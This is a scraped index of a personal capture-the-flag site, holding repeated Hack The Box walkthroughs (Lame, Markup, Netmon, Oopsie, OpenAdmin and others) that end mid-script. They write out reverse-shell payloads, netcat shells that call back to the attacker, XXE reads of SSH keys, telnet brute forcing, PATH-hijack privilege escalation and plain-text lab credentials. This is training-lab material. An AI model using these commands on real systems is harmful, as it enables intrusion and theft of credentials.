jsp/webapps/42966.py ... it says that tomcat 7.0.88 has vuln at JSP Upload Bypass, then we need to make a bypass file to upload to the website you can check available payload to make a .war file $ msfconsole ... msf> search tomcat ... msf> use exploit/multi/http/tomcat_jsp_upload_bypass msf exploit(multi/http/tomcat_jsp_upload_bypass) > show payloads Compatible Payloads =================== # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 payload/generic/custom normal No Custom Payload 1 payload/generic/shell_bind_tcp normal No Generic Command Shell, Bind TCP Inline 2 payload/generic/shell_reverse_tcp normal No Generic Command Shell, Reverse TCP Inline 3 payload/generic/ssh/interact normal No Interact with Established SSH Connection 4 payload/java/jsp_shell_bind_tcp normal No Java JSP Command Shell, Bind TCP Inline 5 payload/java/jsp_shell_reverse_tcp normal No Java JSP Command Shell, Reverse TCP Inline we got the right payload java/jsp_shell_reverse_tcp make a payload msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.3 LPORT=1234 -f war > file_reverse.war send the file to the website at WAR file to deploy , then deploy it before running the uploaded file, you have to make a netcat connection to get feedback nc -nlvp 1234 then open the oploaded file and done, check your netcat listener","title":"Getting Some Information"},{"location":"ctf/writeup/htb/htb-lame/","text":"Lame \u00b6 Beginer Track Easy Internal Network SAMBA Penetration Tester Level 1 Remote Code Execution CVE-2007-2447 Public Vulnerabilities CVE Exploitation Security Tools $ nmap -sV -sC -Pn --min-rate 5000 10.129.98.0 Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-30 07:01 WIB Nmap scan report for 10.129.98.0 Host is up (0.27s latency). Not shown: 996 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: | STAT: | FTP server status: | Connected to 10.10.14.4 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | vsFTPd 2.3.4 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) | ssh-hostkey: | 1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA) |_ 2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_smb2-time: Protocol negotiation failed (SMB2) | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb-os-discovery: | OS: Unix (Samba 3.0.20-Debian) | Computer name: lame | NetBIOS computer name: | Domain name: hackthebox.gr | FQDN: lame.hackthebox.gr |_ System time: 2022-05-29T20:02:31-04:00 |_clock-skew: mean: 2h00m28s, deviation: 2h49m46s, median: 25s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 70.12 seconds $ ftp 10.129.98.0 Connected to 10.129.98.0. 220 (vsFTPd 2.3.4) Name (10.129.98.0:carloz): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp> ls -la . .. ftp> pwn \"/\" ftp> it doesn't show anything, if we browse CVE-2007-2447 it says The MS-RPC functionality in smbd in Samba 3.0.0 through 3.0.25rc3 allows remote attackers to execute arbitrary commands via shell metacharacters involving the (1) SamrChangePassword function, when the \"username map script\" smb.conf option is enabled, and allows remote authenticated users to execute commands via shell metacharacters involving other MS-RPC functions in the (2) remote printer and (3) file share management. $ searchsploit 3.0.20 ------------------------------------------------------------------------------------------------------------------------------------ --------------------------------- Exploit Title | Path ------------------------------------------------------------------------------------------------------------------------------------ --------------------------------- CubeCart 3.0.20 - '/admin/login.php?goto' Arbitrary Site Redirect | php/webapps/36686.txt CubeCart 3.0.20 - 'switch.php?r' Arbitrary Site Redirect | php/webapps/36687.txt CubeCart 3.0.20 - Multiple Script 'redir' Arbitrary Site Redirects | php/webapps/36685.txt Maxthon Browser 3.0.20.1000 - ref / replace Denial of Service | windows/dos/16084.html Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit) | unix/remote/16320.rb Samba < 3.0.20 - Remote Heap Overflow | linux/remote/7701.txt Spy Emergency 23.0.205 - Unquoted Service Path Privilege Escalation | windows/local/40550.txt ------------------------------------------------------------------------------------------------------------------------------------ --------------------------------- Shellcodes: No Results $ msfconsole msf6 > search samba 3.0.20 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/multi/samba/usermap_script 2007-05-14 excellent No Samba \"username map script\" Command Execution Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script msf6> use exploit/multi/samba/usermap_script msf6 exploit(multi/samba/usermap_script) > show options ... msf6 exploit(multi/samba/usermap_script) > set RHOSTS <target_ip> ... msf6 exploit(multi/samba/usermap_script) > exploit done","title":"Lame"},{"location":"ctf/writeup/htb/htb-lame/#lame","text":"Beginer Track Easy Internal Network SAMBA Penetration Tester Level 1 Remote Code Execution CVE-2007-2447 Public Vulnerabilities CVE Exploitation Security Tools $ nmap -sV -sC -Pn --min-rate 5000 10.129.98.0 Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-30 07:01 WIB Nmap scan report for 10.129.98.0 Host is up (0.27s latency). Not shown: 996 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: | STAT: | FTP server status: | Connected to 10.10.14.4 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | vsFTPd 2.3.4 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) | ssh-hostkey: | 1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA) |_ 2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_smb2-time: Protocol negotiation failed (SMB2) | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb-os-discovery: | OS: Unix (Samba 3.0.20-Debian) | Computer name: lame | NetBIOS computer name: | Domain name: hackthebox.gr | FQDN: lame.hackthebox.gr |_ System time: 2022-05-29T20:02:31-04:00 |_clock-skew: mean: 2h00m28s, deviation: 2h49m46s, median: 25s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 70.12 seconds $ ftp 10.129.98.0 Connected to 10.129.98.0. 220 (vsFTPd 2.3.4) Name (10.129.98.0:carloz): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp> ls -la . .. ftp> pwn \"/\" ftp> it doesn't show anything, if we browse CVE-2007-2447 it says The MS-RPC functionality in smbd in Samba 3.0.0 through 3.0.25rc3 allows remote attackers to execute arbitrary commands via shell metacharacters involving the (1) SamrChangePassword function, when the \"username map script\" smb.conf option is enabled, and allows remote authenticated users to execute commands via shell metacharacters involving other MS-RPC functions in the (2) remote printer and (3) file share management. $ searchsploit 3.0.20 ------------------------------------------------------------------------------------------------------------------------------------ --------------------------------- Exploit Title | Path ------------------------------------------------------------------------------------------------------------------------------------ --------------------------------- CubeCart 3.0.20 - '/admin/login.php?goto' Arbitrary Site Redirect | php/webapps/36686.txt CubeCart 3.0.20 - 'switch.php?r' Arbitrary Site Redirect | php/webapps/36687.txt CubeCart 3.0.20 - Multiple Script 'redir' Arbitrary Site Redirects | php/webapps/36685.txt Maxthon Browser 3.0.20.1000 - ref / replace Denial of Service | windows/dos/16084.html Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit) | unix/remote/16320.rb Samba < 3.0.20 - Remote Heap Overflow | linux/remote/7701.txt Spy Emergency 23.0.205 - Unquoted Service Path Privilege Escalation | windows/local/40550.txt ------------------------------------------------------------------------------------------------------------------------------------ --------------------------------- Shellcodes: No Results $ msfconsole msf6 > search samba 3.0.20 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/multi/samba/usermap_script 2007-05-14 excellent No Samba \"username map script\" Command Execution Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script msf6> use exploit/multi/samba/usermap_script msf6 exploit(multi/samba/usermap_script) > show options ... msf6 exploit(multi/samba/usermap_script) > set RHOSTS <target_ip> ... msf6 exploit(multi/samba/usermap_script) > exploit done","title":"Lame"},{"location":"ctf/writeup/htb/htb-markup/","text":"Markup \u00b6 sudo nmap -sC -A -Pn <target_ip> admin : password hacktricks <?xml version=\"1.0\"?> <!DOCTYPE foo [<!ENTITY example SYSTEM \"file:///c:/windows/win.ini\"> ]> <order> <quantity> 2 </quantity> <item> &example; </item> <address> Test </address> </order> <?xml version=\"1.0\"?> <!DOCTYPE foo [<!ENTITY example SYSTEM \"file:///c:/users/daniel/.ssh/id_rsa\"> ]> <order> <quantity> 2 </quantity> <item> &example; </item> <address> Test </address> </order> touch id_rsa chmod 400 id_rsa ssh -i id_rsa daniel@<target_ip> wevtutil Privilege Escalation \u00b6 cd /Log-Management icacls job.bat wget https://github.com/int0x33/nc.exe/blob/master/nc64.exe sudo python -m http.server 1234 powershell wget http://<your_ip>/nc64.exe -o nc64.exe exit sudo nc -nlvp 5555 echo C:\\Log-Management\\nc64.exe -e cmd.exe {your_IP} {port} > C:\\Log-Management\\job.bat","title":"Markup"},{"location":"ctf/writeup/htb/htb-markup/#markup","text":"sudo nmap -sC -A -Pn <target_ip> admin : password hacktricks <?xml version=\"1.0\"?> <!DOCTYPE foo [<!ENTITY example SYSTEM \"file:///c:/windows/win.ini\"> ]> <order> <quantity> 2 </quantity> <item> &example; </item> <address> Test </address> </order> <?xml version=\"1.0\"?> <!DOCTYPE foo [<!ENTITY example SYSTEM \"file:///c:/users/daniel/.ssh/id_rsa\"> ]> <order> <quantity> 2 </quantity> <item> &example; </item> <address> Test </address> </order> touch id_rsa chmod 400 id_rsa ssh -i id_rsa daniel@<target_ip> wevtutil","title":"Markup"},{"location":"ctf/writeup/htb/htb-markup/#privilege-escalation","text":"cd /Log-Management icacls job.bat wget https://github.com/int0x33/nc.exe/blob/master/nc64.exe sudo python -m http.server 1234 powershell wget http://<your_ip>/nc64.exe -o nc64.exe exit sudo nc -nlvp 5555 echo C:\\Log-Management\\nc64.exe -e cmd.exe {your_IP} {port} > C:\\Log-Management\\job.bat","title":"Privilege Escalation"},{"location":"ctf/writeup/htb/htb-md5fl/","text":"Emdee five for life \u00b6 Easy misc import requests import hashlib r = requests . session () url = \"http://htb:port\" html = r . get ( url ) html = html . text tx1 = \"<h1 align='center'>MD5 encrypt this string</h1><h3 align='center'>\" tx2 = '</h3><center><form action=\"\" method=\"post\">' text = html . split ( tx1 )[ 1 ] . split ( tx2 )[ 0 ] hs = hashlib . md5 ( text . encode ()) . hexdigest () data = { 'hash' : hs } y = req . post ( url = url , data = data ) print ( y . text )","title":"Emdee five for life"},{"location":"ctf/writeup/htb/htb-md5fl/#emdee-five-for-life","text":"Easy misc import requests import hashlib r = requests . session () url = \"http://htb:port\" html = r . get ( url ) html = html . text tx1 = \"<h1 align='center'>MD5 encrypt this string</h1><h3 align='center'>\" tx2 = '</h3><center><form action=\"\" method=\"post\">' text = html . split ( tx1 )[ 1 ] . split ( tx2 )[ 0 ] hs = hashlib . md5 ( text . encode ()) . hexdigest () data = { 'hash' : hs } y = req . post ( url = url , data = data ) print ( y . text )","title":"Emdee five for life"},{"location":"ctf/writeup/htb/htb-meow/","text":"Meow \u00b6 #nmap #23/tcp #telnet #metasploit nmap -sV <ip> Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-10 00:59 WIB Nmap scan report for <ip> Host is up (0.25s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 23/tcp open telnet Linux telnetd Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 58.72 seconds telnet <ip> Trying <ip>... Connected to <ip>. Escape character is '^]'. \u2588 \u2588 \u2590\u258c \u2584\u2588\u2584 \u2588 \u2584\u2584\u2584\u2584 \u2588\u2584\u2584\u2588 \u2580\u2580\u2588 \u2588\u2580\u2580 \u2590\u258c\u2584\u2580 \u2588 \u2588\u2580\u2588 \u2588\u2580\u2588 \u2588\u258c\u2584\u2588 \u2584\u2580\u2580\u2584 \u2580\u2584\u2580 \u2588 \u2588 \u2588\u2584\u2588 \u2588\u2584\u2584 \u2590\u2588\u2580\u2584 \u2588 \u2588 \u2588 \u2588\u2584\u2584 \u2588\u258c\u2584\u2588 \u2580\u2584\u2584\u2580 \u2588\u2580\u2588 Meow login: Password: Login incorrect Meow login: admin Password: Login incorrect Meow login: ^CConnection closed by foreign host. brute force login, beberapa cara : metasploit vim file.txt admin password root 123456 msfconsole search telnet_login use auxiliary/scanner/telnet/telnet_login set STOP_ON_SUCCESS true set RHOST <ip> set USER_FILE file.txt set PASS_FILE file.txt run username root password <empty> cari sendiri mungkin ada:D","title":"Meow"},{"location":"ctf/writeup/htb/htb-meow/#meow","text":"#nmap #23/tcp #telnet #metasploit nmap -sV <ip> Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-10 00:59 WIB Nmap scan report for <ip> Host is up (0.25s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 23/tcp open telnet Linux telnetd Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 58.72 seconds telnet <ip> Trying <ip>... Connected to <ip>. Escape character is '^]'. \u2588 \u2588 \u2590\u258c \u2584\u2588\u2584 \u2588 \u2584\u2584\u2584\u2584 \u2588\u2584\u2584\u2588 \u2580\u2580\u2588 \u2588\u2580\u2580 \u2590\u258c\u2584\u2580 \u2588 \u2588\u2580\u2588 \u2588\u2580\u2588 \u2588\u258c\u2584\u2588 \u2584\u2580\u2580\u2584 \u2580\u2584\u2580 \u2588 \u2588 \u2588\u2584\u2588 \u2588\u2584\u2584 \u2590\u2588\u2580\u2584 \u2588 \u2588 \u2588 \u2588\u2584\u2584 \u2588\u258c\u2584\u2588 \u2580\u2584\u2584\u2580 \u2588\u2580\u2588 Meow login: Password: Login incorrect Meow login: admin Password: Login incorrect Meow login: ^CConnection closed by foreign host. brute force login, beberapa cara : metasploit vim file.txt admin password root 123456 msfconsole search telnet_login use auxiliary/scanner/telnet/telnet_login set STOP_ON_SUCCESS true set RHOST <ip> set USER_FILE file.txt set PASS_FILE file.txt run username root password <empty> cari sendiri mungkin ada:D","title":"Meow"},{"location":"ctf/writeup/htb/htb-netmon/","text":"Netmon \u00b6 Easy Internal Enumeration FTP Penetration Tester Level 1 Weak Authentication CVE-2018-9276 CVE Exploitation Public Vulnerabilities Remote Code Execution $ nmap -sV -sC -Pn --min-rate 10000 10.129.96.142 Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-30 21:08 EDT Nmap scan report for 10.129.96.142 Host is up (0.057s latency). Not shown: 995 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) | 02-03-19 12:18AM 1024 .rnd | 02-25-19 10:15PM <DIR> inetpub | 07-16-16 09:18AM <DIR> PerfLogs | 02-25-19 10:56PM <DIR> Program Files | 02-03-19 12:28AM <DIR> Program Files (x86) | 02-03-19 08:08AM <DIR> Users |_02-25-19 11:49PM <DIR> Windows 80/tcp open http Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor) |_http-server-header: PRTG/18.1.37.13946 |_http-trane-info: Problem with XML parsing of /evox/about | http-title: Welcome | PRTG Network Monitor (NETMON) |_Requested resource was /index.htm 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open tcpwrapped Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-time: | date: 2022-05-31T01:08:29 |_ start_date: 2022-05-31T01:06:52 | smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 95.05 seconds $ ftp 10.129.96.142 Connected to 10.129.96.142. 220 Microsoft FTP Service Name (10.129.96.142:kali): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp> Users\\user.txt after looking around and trying more, we found the files needed ftp> cd \"/ProgramData/Paessler/PRTG Network Monitor\" ftp> get \"PRTG Configuration.old.bak\" the get \"PRTG Configuration.old.bak\" command sometimes close by itself, so do more until you get the full text or at least the required text ... </dbcredentials> <dbpassword> <!-- User: prtgadmin --> PrTg@dmin2018 </dbpassword> <dbtimeout> ... but the password was wrong, if we look back at the date, we know that new Configuration was in 2019 ... 02-25-19 10:54PM 1189697 PRTG Configuration.dat 02-25-19 10:54PM 1189697 PRTG Configuration.old 07-14-18 03:13AM 1153755 PRTG Configuration.old.bak ... when trying with PrTg@dmin2019 , finally got it right download github.com/chcx $ chmod +x prtg-exploit.sh $ ./prtg-exploit.sh -u http://10.129.96.142 -c \"_ga=GA1.4.XXXXXXX.XXXXXXXX; _gid=GA1.4.XXXXXXXXXX.XXXXXXXXXXXX; OCTOPUS1813713946=XXXXXXXXXXXXXXXXXXXXXXXXXXXXX; _gat=1\" it will cread cred pentest:P3nT3st! . use psexec.py from impacket to get shell $ ~/Documents/impacket/examples/psexec.py pentest:'P3nT3st!'@10.129.96.142 done","title":"Netmon"},{"location":"ctf/writeup/htb/htb-netmon/#netmon","text":"Easy Internal Enumeration FTP Penetration Tester Level 1 Weak Authentication CVE-2018-9276 CVE Exploitation Public Vulnerabilities Remote Code Execution $ nmap -sV -sC -Pn --min-rate 10000 10.129.96.142 Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-30 21:08 EDT Nmap scan report for 10.129.96.142 Host is up (0.057s latency). Not shown: 995 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) | 02-03-19 12:18AM 1024 .rnd | 02-25-19 10:15PM <DIR> inetpub | 07-16-16 09:18AM <DIR> PerfLogs | 02-25-19 10:56PM <DIR> Program Files | 02-03-19 12:28AM <DIR> Program Files (x86) | 02-03-19 08:08AM <DIR> Users |_02-25-19 11:49PM <DIR> Windows 80/tcp open http Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor) |_http-server-header: PRTG/18.1.37.13946 |_http-trane-info: Problem with XML parsing of /evox/about | http-title: Welcome | PRTG Network Monitor (NETMON) |_Requested resource was /index.htm 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open tcpwrapped Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-time: | date: 2022-05-31T01:08:29 |_ start_date: 2022-05-31T01:06:52 | smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 95.05 seconds $ ftp 10.129.96.142 Connected to 10.129.96.142. 220 Microsoft FTP Service Name (10.129.96.142:kali): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp> Users\\user.txt after looking around and trying more, we found the files needed ftp> cd \"/ProgramData/Paessler/PRTG Network Monitor\" ftp> get \"PRTG Configuration.old.bak\" the get \"PRTG Configuration.old.bak\" command sometimes close by itself, so do more until you get the full text or at least the required text ... </dbcredentials> <dbpassword> <!-- User: prtgadmin --> PrTg@dmin2018 </dbpassword> <dbtimeout> ... but the password was wrong, if we look back at the date, we know that new Configuration was in 2019 ... 02-25-19 10:54PM 1189697 PRTG Configuration.dat 02-25-19 10:54PM 1189697 PRTG Configuration.old 07-14-18 03:13AM 1153755 PRTG Configuration.old.bak ... when trying with PrTg@dmin2019 , finally got it right download github.com/chcx $ chmod +x prtg-exploit.sh $ ./prtg-exploit.sh -u http://10.129.96.142 -c \"_ga=GA1.4.XXXXXXX.XXXXXXXX; _gid=GA1.4.XXXXXXXXXX.XXXXXXXXXXXX; OCTOPUS1813713946=XXXXXXXXXXXXXXXXXXXXXXXXXXXXX; _gat=1\" it will cread cred pentest:P3nT3st! . use psexec.py from impacket to get shell $ ~/Documents/impacket/examples/psexec.py pentest:'P3nT3st!'@10.129.96.142 done","title":"Netmon"},{"location":"ctf/writeup/htb/htb-oopsie/","text":"Oopsie \u00b6 #linux #PHP #SUID nmap -sV -sC <IP_TARGET> Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-13 22:02 WIB Nmap scan report for 10.129.60.152 Host is up (0.25s latency). Not shown: 993 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA) | 256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA) |_ 256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519) 26/tcp filtered rsftp 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Welcome |_http-server-header: Apache/2.4.29 (Ubuntu) 646/tcp filtered ldp 3737/tcp filtered xpanel 8180/tcp filtered unknown 8192/tcp filtered sophos Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 55.92 seconds buka browser dengan menggunakan OWASP ZAP (atau tools lain), diketahui menu login ada di /cdn-cgi/login url injection menu action id=1, diketahui nilai value admin inspect -> storage -> cookies ganti value menjadi admin dan access ID admin 34322 lalu kembali ke menu upload, dan akan mengupload reverse shell source webshells , dan kali ini akan mengupload file php php-reverse-shell.php modifikasi $ip dan $port sesuai milik kita, misal port 12345 , lalu upload melihat list folder pada website, (target \"upload\" folder) gobuster dir --url http://{TARGET_IP}/ --wordlist directory-list-1.0.txt -x php diketahui terdapat folder /uploads *biasanya directory-list ada difolder /usr/share/wordlist, atau download google seperti writeup sebelumnya membuat netcat listener nc -lvnp 12345 http://{TARGET_IP}/uploads/php-reverse-shell.php listener sudah mendapat response mencoba mendapatkan fungsional shell python3 -c 'import pty;pty.spawn(\"/bin/bash\")' lalu setelah mencari, dapat memasuki folder /var/www/html/cdn-cgi/login/ cat * | grep -i passw* cat db.php cat /etc/passwd user robert dengan password M3g4C0rpUs3r! su robert ls /home/robert/ id diketahui bahwa robert bagian dari group bugtracker find / -group bugtracker 2> /dev/null /usr/bin/bugtracker echo \"/bin/sh\" > /tmp/cat chmod +x /tmp/cat export PATH=/tmp:$PATH echo $PATH bugtracker done","title":"Oopsie"},{"location":"ctf/writeup/htb/htb-oopsie/#oopsie","text":"#linux #PHP #SUID nmap -sV -sC <IP_TARGET> Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-13 22:02 WIB Nmap scan report for 10.129.60.152 Host is up (0.25s latency). Not shown: 993 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA) | 256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA) |_ 256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519) 26/tcp filtered rsftp 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Welcome |_http-server-header: Apache/2.4.29 (Ubuntu) 646/tcp filtered ldp 3737/tcp filtered xpanel 8180/tcp filtered unknown 8192/tcp filtered sophos Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 55.92 seconds buka browser dengan menggunakan OWASP ZAP (atau tools lain), diketahui menu login ada di /cdn-cgi/login url injection menu action id=1, diketahui nilai value admin inspect -> storage -> cookies ganti value menjadi admin dan access ID admin 34322 lalu kembali ke menu upload, dan akan mengupload reverse shell source webshells , dan kali ini akan mengupload file php php-reverse-shell.php modifikasi $ip dan $port sesuai milik kita, misal port 12345 , lalu upload melihat list folder pada website, (target \"upload\" folder) gobuster dir --url http://{TARGET_IP}/ --wordlist directory-list-1.0.txt -x php diketahui terdapat folder /uploads *biasanya directory-list ada difolder /usr/share/wordlist, atau download google seperti writeup sebelumnya membuat netcat listener nc -lvnp 12345 http://{TARGET_IP}/uploads/php-reverse-shell.php listener sudah mendapat response mencoba mendapatkan fungsional shell python3 -c 'import pty;pty.spawn(\"/bin/bash\")' lalu setelah mencari, dapat memasuki folder /var/www/html/cdn-cgi/login/ cat * | grep -i passw* cat db.php cat /etc/passwd user robert dengan password M3g4C0rpUs3r! su robert ls /home/robert/ id diketahui bahwa robert bagian dari group bugtracker find / -group bugtracker 2> /dev/null /usr/bin/bugtracker echo \"/bin/sh\" > /tmp/cat chmod +x /tmp/cat export PATH=/tmp:$PATH echo $PATH bugtracker done","title":"Oopsie"},{"location":"ctf/writeup/htb/htb-openadmin/","text":"OpenAdmin \u00b6 Easy External Penetration Tester Level 1 OS Command Injection A03:2021-Injection Web Site Structure Discovery Local File Inclusion A07:2021-Identification And Authentication Failures Public Vulnerabilities Password Reuse Enumeration Hard-coded Credentials Authentication Directory Traversal Lateral Movement Weak Credentials Source Code Review Password Cracking Sudo Exploitation $ nmap -sV -sC 10.129.131.235 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-11 15:37 WIB Nmap scan report for 10.129.131.235 Host is up (0.057s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA) | 256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA) |_ 256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Apache2 Ubuntu Default Page: It works |_http-server-header: Apache/2.4.29 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 30.61 seconds $ gobuster dir --url http://10.129.131.235/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.129.131.235/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/06/11 16:45:09 Starting gobuster in directory enumeration mode =============================================================== /music (Status: 301) [Size: 316] [--> http://10.129.131.235/music/] Progress: 388 / 87665 (0.44%) ^C [!] Keyboard interrupt detected, terminating. =============================================================== 2022/06/11 16:45:13 Finished =============================================================== there are music directory, then we proceed to the login page here we find that is a OpenNetAdmin , and it said that the website use v18.1.1 version, so i wanna check the vulnerable using searchploit $ searchsploit opennetadmin ------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- OpenNetAdmin 13.03.01 - Remote Code Execution | php/webapps/26682.txt OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit) | php/webapps/47772.rb OpenNetAdmin 18.1.1 - Remote Code Execution | php/webapps/47691.sh ------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results it turns out that there is a RCE vulnerable cat /usr/share/exploitdb/exploits/php/webapps/47691.sh # Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution # Date: 2019-11-19 # Exploit Author: mattpascoe # Vendor Homepage: http://opennetadmin.com/ # Software Link: https://github.com/opennetadmin/ona # Version: v18.1.1 # Tested on: Linux # Exploit Title: OpenNetAdmin v18.1.1 RCE # Date: 2019-11-19 # Exploit Author: mattpascoe # Vendor Homepage: http://opennetadmin.com/ # Software Link: https://github.com/opennetadmin/ona # Version: v18.1.1 # Tested on: Linux #!/bin/bash URL = \" ${ 1 } \" while 